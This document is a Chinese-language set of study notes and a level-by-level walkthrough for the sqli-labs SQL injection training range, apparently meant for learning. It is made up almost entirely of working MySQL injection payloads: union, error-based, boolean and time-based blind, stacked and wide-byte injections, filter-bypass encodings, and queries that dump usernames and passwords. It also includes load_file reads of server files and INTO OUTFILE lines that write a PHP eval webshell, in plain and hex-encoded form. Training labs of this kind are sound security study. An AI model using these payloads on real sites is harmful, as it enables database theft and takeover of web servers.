# Sql注入方法及过关

```
（1） 、 通过源码和手工的方式， 将所有的注入方式和造成漏洞的原因找出来， 并进行学习。
此处要求是对每一个类型的注入进行“深刻” 的了解， 了解其原理和可能应用到的场景。
（2） 通过工具进行攻击， 我们此处推荐使用 sqlmap。 此过程中， 了解 sqlmap 的使用方法，
要求掌握 sqlmap 的流程和使用方法， 精力较足的话， 针对一些问题会附 sqlmap 的源码分析。
（3） 自己实现自动化攻击， 这一过程， 我们根据常见的漏洞， 自己写脚本来进行攻击。 此
处推荐 python 语言。 同时， sql-labs 系统是 php 写的， 这里个人认为可以精读一下每关的源
码， 同时针对有些关卡， 可以尝试着添加一些代码来增强安全性。
```

常用函数

```mysql
1. version()——MySQL 版本
2. user()——数据库用户名
3. database()——数据库名
4. @@datadir——数据库路径
5. @@basedir--当前文件路径
5. @@version_compile_os——操作系统版本
```

常用路径

```mysql
winserver的iis默认路径c:\Inetpub\wwwroot
linux的nginx一般是/usr/local/nginx/html,/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
apache 就.../var/www/htm，.../var/www/html/htdocs
phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\
xammp 就是...\xampp\htdocs
```

字符串连接函数

```mysql
函数具体介绍 http://www.cnblogs.com/lcamry/p/5715634.html
1. concat(str1,str2,...)——没有分隔符地连接字符串
2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
3. group_concat(str1,str2,...)——连接一个组的所有字符串， 并以逗号分隔每一条数据
```

information_schema

```mysql
猜数据库
select schema_name from information_schema.schemata
猜某库的数据表
select table_name from information_schema.tables where table_schema=’ xxxxx’
猜某表的所有列
Select column_name from information_schema.columns where table_name=’ xxxxx’
获取某列的内容
Select *** from ****  获取数据
```

**双查询注入** (参考13，注意concat里面sql语句需要加括号)

```mysql
select concat((select database()),floor(rand()*2))
select concat((select database()),floor(rand()*2))from information_schema.tables(表名); //返回数量由表本身几条决定
select concat((select database()),floor(rand()*2)) as a from information_schema.tables;//加别名，此时a即concat((select database()),floor(rand()*2))
SELECT concat((SELECT database()), floor(rand()*2))as a from information_schema.tables group by a;  //group by对返回进行分组处理，直接使用前面的别名

下面利用count函数和上面操作构成mysql内部错误，通过报错返回信息
SELECT count(*),concat('~',(SELECT database()),'~', floor(rand()*2))as a from information_schema.tables group by a;  //爆库，爆用户用user(),  concat()中间可任意加符号将结果更清晰,基本框架,更改‘select database()’成其他sql语句即可
select count(*),concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+  //爆表名，修改limit x,1 可以遍历表名
select count(*),concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a--+


Select 1 from (select count(*), concat('~',(select user()),'~', floor(rand()*2))as a from information_schema.tables group by a)x;  //派生表 select 1 from (table_name)，使一个报错，另一个的结果就会出现在报错的信息中

```

**布尔盲注** (参照page1-8)

```mysql
1. and left(version(),1)=8#   //出版本
2. and length(database())=8#   //出数据库长度
3. and left(database(),1)>'a'--+   //看第一位是否大于a，手注二分法爆数据库名，
4. and left(database(),2)>'sa'--+   //同上方法，下面同理
5. and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101--+       //ascii爆表字符，limit的第一个是控制列数
6. and 1=(select 1 from information_schema.columns where
   table_name='users' and column_name regexp '^username' limit 0,1)--+  //regexp查看users表是否有username的列
7. and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+     //ord() 和mid() 获取security.users表下第一行的字符数=D，同样可以爆破出所有数据
```

**报错注入**  ()

```mysql
*1. union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+   //双查询注入
2. union select (exp(~(select * FROM(SELECT USER())a))),2,3--+   //double数值类型超出范围进行报错注入
3. union select (!(select * from (select user())x) - ~0),2,3--+  //bigint溢出报错注入
*4. and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+  //同双查询用法，union换成and,删掉后面的count,group等即可，优先使用
    and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+    //xpath函数报错注入
5. union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
//数据重复性
```
**延时注入** (参照page1-9)

```mysql
1. and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+  //sleep()函数注入
2. UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+  //BENCHMARK()函数注入
BENCHMARK(count,expr)用于测试函数的性能， 参数一为次数， 二为要执行的表达式。 可以让函数执行若干次， 返回结果比平时要长， 通过时间长短的变化， 判断语句是否执行成功。 这是一种边信道攻击， 在运行过程中占用大量的 cpu 资源。 推荐使用 sleep()
```

**导入导出相关操作** (参考page1-7)

```mysql
1. load_file()导出文件：load_file(file_name)读取文件并返回该文件内容作为字符串
   1. 必须有权限读取并且文件必须完全可读
      and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限 返回错误， 应该是管理员给数据库帐户降权  
   2. 读取文件必须在服务器上
   3. 必须指定文件完整路径
   4. 读取文件必须小于max_allowed_packet  

      //任意不满足都返回空。难点是绝对物理路径和构造有效畸形语句(报错出绝对路径)

      在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露
      WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务
      器的安全将受到严重的威胁。  http://www.cnblogs.com/lcamry/p/5729087.html

      示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
      利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。

      -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
      Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码

      -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)
      Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”

      -1 union select 1,1,1,load_file(c:\\boot.ini)
      Explain:路径里的/用 \\\代替  

2. 文件导入到数据库：LOAD DATA INFILE用于高速地从一个文本文件读取行，并装入表中
   1. (需要特殊文件，如配置文件、密码文件，将系统文件利用load data infile导入数据库)
   2. 示例： load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t'
      lines terminated by '\n'  

3. 导入到文件：SELECT.....INTO OUTFILE 'file_name'  把被选择行写入文件中，文件被创建到服务器，需要有file权限，而且文件不能已存在
   1. Select version() into outfile “c:\\phpnow\\htdocs\\test.php”  //一句话木马用法,version替换
   2. Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16   //改文件结尾，0x16可以是一句话或任意代码
      1. 注意文件路径转义
      2. select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’  //前台无法导出数据时，配合该语句(非常多配置文件都可以导出)
```

**增删改查**(参考page3-38)

```mysql
增：insert into users values('16','aasd','asd');creat table users1;
删数据：delete from 表名; delete from 表名 where id=1; 
删数据库：drop database 数据库名;
删表：drop table 表名;
删表中列：alter talbe 表名 drop column 列名;
查:select load_file('c:/xx.php');select * from 表名 limit 1,1;
```

**二次注入**(参考page2-24)

```
1. 构造数据，像服务器发送恶意请求
2. 服务器保存
3. 向服务端发送与第一次不相同请求
4. 服务收到请求查询时，导致第一次恶意请求被执行
```

**宽字节注入**(参考page2-23)

```php
GBK编码会将两个字符为一个汉字，在'被过滤时候，可以在前面加一个%df，从而吃掉后面的\，达到'逃逸的效果
将\过滤，构造%**%5c%5c%27，5c会被注释掉

check_addslashes() ,遇到单引号和双引号还有反斜杠会自动添加反斜杠
addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
stripslashes()，删除由addslashes()添加的反斜杠
mysql_real_escape_string() ,转义字符串中特殊字符  \x00 \n \r \ " ' \x1a
```

**堆叠注入**(参考page3-43)

```mysql
堆叠注入可以执行任意语句，而union all 语句类型有限
堆叠注入是一致性执行多个语句，分号区别开；而二次注入是注入恶意语句后再调用
```

**order by**(参考page3-48)

```mysql
order by 用作排序，后面可以用123代替列名，也可以直接写列名，默认小到大
1.1 直接添加注入语句 ?sort=(select ***)
1.2 利用一些函数，如 ?sort=rand()
1.3 利用and加sql语句，?sort and  ，后面接报错注入(extractvalue)或延时(ascii)
2. procedure analyse参数后注入  
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) //version换(sql)
3. 导入导出文件into outfile参数
?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test
Into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行 16 进制转
换)
0x3c3f70687020706870696e666f28293b3f3e2020  phpinfo
0x3C3F70687020406576616C28245F504F53545B2778275D293B3F3E  post['x']
```





**Page-1  基本注入**

1. ?id=-1' union select 1,2,3--+
2. ?id=-1 union select 1,2,3--+
3. ?id=-1' ') union select 1,2,3--+
4. ?id=-1' '") union select 1,2,3--+
5. 盲注
   1. and left(version(),1)=8#   //出版本
   2. and length(database())=8#   //出数据库长度
   3. and%20ascii(substr(database(),§1§,1))=§101§--+，bp数字直接交叉爆破出数据库名,第一个1-8，第二个控制80-122，一次性爆出数据库名security
   4. and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit §0§,1),§1§,1))=§101§--+，bp爆破第一个列数量，第二个爆破列名位置，第三个是ascii字符，成功爆破出所有列名
   5.  and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+     //ord() 和mid() 获取security.users表下第一行的字符数=D，同样可以爆破出所有数据
6. 盲注："，同上
7. get文件写入：
   1. ?id=1')) union select @@basedir,@@database,3#  //出文件路径
   2. ?id=1')) union select 1,2,3 into outfile "C:\\inetpub\\target\\sqlilabs\\123.txt" --+写入文件查看后台，注意转义双斜杠
   3. ?id=1'))union select 1,2,"<?php @eval($_POST['x']);?>" into outfile "C:\\inetpub\\target\\sqlilabs\\12.php" --+    //文献文件后写入一句话木马，访问ip/12.php，本题的难点是获取对方网站的目录结构，有针对性的创建木马文件
8. get盲注布尔类型：本地注释报错注入，直接爆表
   1. and left(version(),1)=8#   //出版本
   2. and length(database())=8#   //出数据库长度
   3. and%20ascii(substr(database(),§1§,1))=§101§--+，bp数字直接交叉爆破出数据库名,第一个1-8，第二个控制80-122，一次性爆出数据库名security
   4. and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit §0§,1),§1§,1))=§101§--+，bp爆破第一个列数量，第二个爆破列名位置，第三个是ascii字符，成功爆破出所有列名
   5. and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+     //ord() 和mid() 获取security.users表下第一行的字符数=D，同样可以爆破出所有数据
9. get盲注时间：看了代码，什么错误都不报
   1. and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+  //bp设置2s放弃开始爆破出数据库
   2. and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+    //bp爆破数据库的表
   3. and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+    //bp爆破users表的列，users处加入上面爆破出的表同时爆破
   4. and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+  //bp爆破值，username和users处加入上面爆破出的列与表同时爆破
10. get盲注时间：同上，'换"
11. post表单: 
    1. uname=1' or '1'='1# &passwd=admin&submit=Submit 
    2. uname=1' union select 1,2# &passwd=admin&submit=Submit   //万能密码
12. post表单: uname=-admin") union select 1,2# &passwd=admin&submit=Submit  //同上
13. post无回显注入：
    1. 随便输入符号，报错发现数据库构造 ("id")，使用双查询注入
    2. uname=-admin‘) union select count( * ),concat(**(select database())**,'~',floor(rand()*2)) as a from information_schema.tables group by a#   //爆使用的库
    3. uname=-admin’)union select count( * ),concat('~',(**select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1**),'~',floor(rand()*2)) as a from information_schema.tables group by a#   //更换limit x,1遍历表
    4. uname=-admin‘)union select count( * ),concat('~',(**select concat(column_name) from information_schema.columns where table_name='users' limit 1,1**),'~',floor(rand()*2)) as a from information_schema.tables group by a#   //更换limit x,1遍历列
    5. uname=-admin’)union select count( * ),concat('~',(**select concat_ws('[',password,username) from users limit 1,1**),'~',floor(rand()*2)) as a from information_schema.tables group by a#   //更换limit x,1遍历数据
    6. uname=-admin‘)and extractvalue(1,concat('~',(select @@basedir),'~'))#  //该题还可使用报错注入，
14. post双注入：换成 "，其他同上
15. post盲注布尔类型：看8
16. post盲注布尔类型：看9
17. post更新账号密码：账号有过滤，密码输入'报错，直接用
    1. ​              1' and extractvalue(1,concat(0x7e,(select concat(table_name)from information_schema.tables where table_schema=database()),'0x7e'),1)#   //爆表,三层嵌套，最外层包含1，第二层包含0x7e，第三层是sql语句
    2. extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and column_name not in ('user_id','user','first_name','last_name','avatar','last_login','failed_login')),0x7e),1)#  //爆列名
    3. updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)#   //爆值，报错显示specify target，嵌套多一个select
    4. updatexml(1,concat(0x7e,(select password from (select password from users where username='admin')),0x7e),1)#  //提示every denived table must have alias ，即需要名字
    5. updatexml(1,concat(0x7e,(select password from (select password from users where username='admin') mingzi ),0x7e),1)#  //加名字即可爆出un为admin的password
    6. updatexml(1,concat(0x7e,(select password from (select password from users limit 1,1) test ),0x7e),1)#   //第二种方法，去掉where，直接limit一个一个爆
18. post头部uagent注入：抓包改user-agent,'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and '1'='1  
19. post头部referer注入:同上
20. post  cookie注入:抓包改cookie  admin'and extractvalue(1,concat((select @@datadir)))#



**Page-2  进阶注入**

21. cookie注入 base64加密：变成')   抓包改cookie，是base64加密

22. cookie注入 base64加密：同上，变成"

23. 回显，注释过滤：注释符被过滤，有回显，?id=-1' union select 1,2,'3
    1. id=-1' union select 1,concat((select schema_name from information_schema.schemata limit 1,1)),'3  //负号是为了超出范围，执行后续语句；第一个引号闭合-1，第二个闭合后面，这样将查询内容显示出来
    2. -1' union select 1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='emails')),'3
    3. (select concat(id) from security.emails limit 0,1),'3

24. 二次注入：注册admin'#账户，修改密码为12，进入数据库查看，发现admin被修改为12，因为读取时是'uname'  ，输入admin'#变成 'admin'#'  ，被截断为admin

25. or-and过滤变形：绕过or 和 and过滤，此处利用符号绕过

    1. 大小写变形 OR,Or,oR
    2. 编码绕过，hex,urlencode
    3. 添加注释/**/
    4. 利用符号|| = or  &&=and

    25a  不回显，过滤or and ：?id=-1 union select 1,2,3#

26. 过滤空格与注释：注释过滤可以再写一个||'1 将其闭合，%09=tab水平  , %0a=换行,%0c=换页,%0d=return,%0b=TAb垂直，%a0=空格

    1. ?id=1'%a0union%a0 select%a0 1,2,3%a0||'1  //所有空格用%a0替代
    2. 正常回显，将前面1换成超出范围的数字，执行后续语句，成功

    26a  ?id=8981')%a0union%a0select%a01,2,3%a0||('1    加括号

27. union select变形，空格过滤：大小写绕过   %a0编码绕过  ?id=221'%a0UnIon%a0SelEct%a01,2,3%a0||'1

    27a   ?id=71"%a0UnIon%a0SelEct%a01,2,3%a0||%a0"1   //双引号注入

28. ?id=71')unioN%a0Select%a01,2,3||('1  //括号引号

    28a  少了and or 过滤，同上

29. ?id=1&id=661'unioN%a0SeleCT%a01,database(),3 --+

30. ?id=1&id=552"union select 1,2,3 --+

31. 单引号括号

32. 双引号括号

33. 加斜杠 宽字节注入get：?id=221%df'union select 1,2,3 --+   //利用字符串宽字节%df逃逸'  

34. 加斜杠绕过 宽字节注入post：

    1. 法1  post会经过urlencode转码，将'转为utf-16或32，万能密码登录  uname=221�'or 1=1#&passwd=1&submit=Submit  //查数据or与引号中间加sql语句

    2. 法2   bp拦截的是encode后的post数据，因此可以抓包后直接更改为  uname=221%df' or 1=1#

       uname=admin%df'or 1 limit 1,1#&passwd=aaa&submit=Submit*  //水平越权登录

35. 加斜杠绕过：?id=234%20union select 1,2,3 or%201=1#  

36. mysql_real_escape_string() 过滤get：?id=-1%df%27union select 1,2,3 --+  //宽字节注入

    ?id=-1%EF%BF%BD%27union select 1,2,3 --+   //数据库未设置gbk，可以利用utf-16加密绕过

37. mysql_real_escape_string() 过滤post：有urlencode，需要包传输修改为宽字节注入;另外还可以万能密码，uname=221�'or 1=1#&passwd=1&submit=Submit



**Page-3 堆叠注入**

38. 堆叠回显get：?id=1';insert into users(id,username,password) values('15','1','1')  --+  //create,insert需要不重复，update可重复，users后面列名可删除，values的单引号也可去除

39. 去掉单引号即可

40. 堆叠盲注get：加括号同上

41. 堆叠盲注get：纯数字注入

42. 报错堆叠注入post：login_user=admin&login_password=1';creat table 123 like users#&mysubmit=Login //注意提交的是login.php

43. 报错堆叠注入post：login_user=admin&login_password=1');creat table 123 like users#&mysubmit=Login //注意提交的是login.php

44. login_user=admin&login_password=1';creat table less44 like users#&mysubmit=Login 

45. login_user=admin&login_password=1');creat table less44 like users#&mysubmit=Login 

46. ORDER BY回显：

    1. ?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
    2. version()换成(select table_name from information_schema where table_schema='security')，爆库表列同
    3. select concat(列名) from 数据库.表名 limit x,x  //爆数据
    
47. ORDER BY回显：

    1. ?sort=1' and (select count( * ) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+  //替换user()
       ?sort=1' and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+  //利用重复报错注入

    2. ?sort=1' procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) --+  //参数注入

    3. ?sort=1 into outfile "c:\\\wamp\\\www\\\sqllib\\\test.php  //导入文件

       ?sort=1'into outfile "c:\\\wamp\\\www\\\sqllib\\\test.php"lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+  //16进制为phpinfo

48. ORDER BY不回显：

    1. ?sort=1 into outfile "C:\\inetpub\\target\\sqlilabs\\Less-48\\test.php"  
    2. ?sort=1 into outfile "C:\\inetpub\\target\\sqlilabs\\Less-48\\test2.php"lines terminated by 0x3C3F70687020406576616C28245F504F53545B2778275D293B3F3E--+   //加密信息为eval_$post['x']

49. 同上

50. order by stacked injection: ?sort=1;insert into users values(15,1,1) --+ //order by + 堆叠注入

51. 多单引号

52. 无回显纯数字

53. 多单引号，无回显

54. 回显get综合实战 

    1. ?id=1' order by 3 --+   //先用orderby尝试出哪个是sql语句
    2. ?id=-1' union select 1,concat((select table_name from information_schema.tables where table_schema='challenges')),3 --+   //查表
    3. ?id=-1' union select 1,concat((select column_name from information_schema.columns where table_name='xkizvxzoay' limit 1,1)),3 --+  //查列
    4. ?id=-1' union select 1,concat((select concat(secret_3R7C) from challenges.u5b66pwa01 limit 0,1)),3 --+   //查数据

55. 回显get综合实战 括号
56. 回显get综合实战 单引号括号 
57. 回显get综合实战  双引号
58. 无回显get实战：?id=1' union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e)) --+  //其他同上
59. 无回显get实战：纯数字
60. 无回显get实战：双引号括号
61. 无回显get实战：单引号双括号
62. 延时注入：?id=1%27)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=%27challenges%27),1,1))=79,0,sleep(10)) --+
63. 双引号
64. 双括号
65. 双引号括号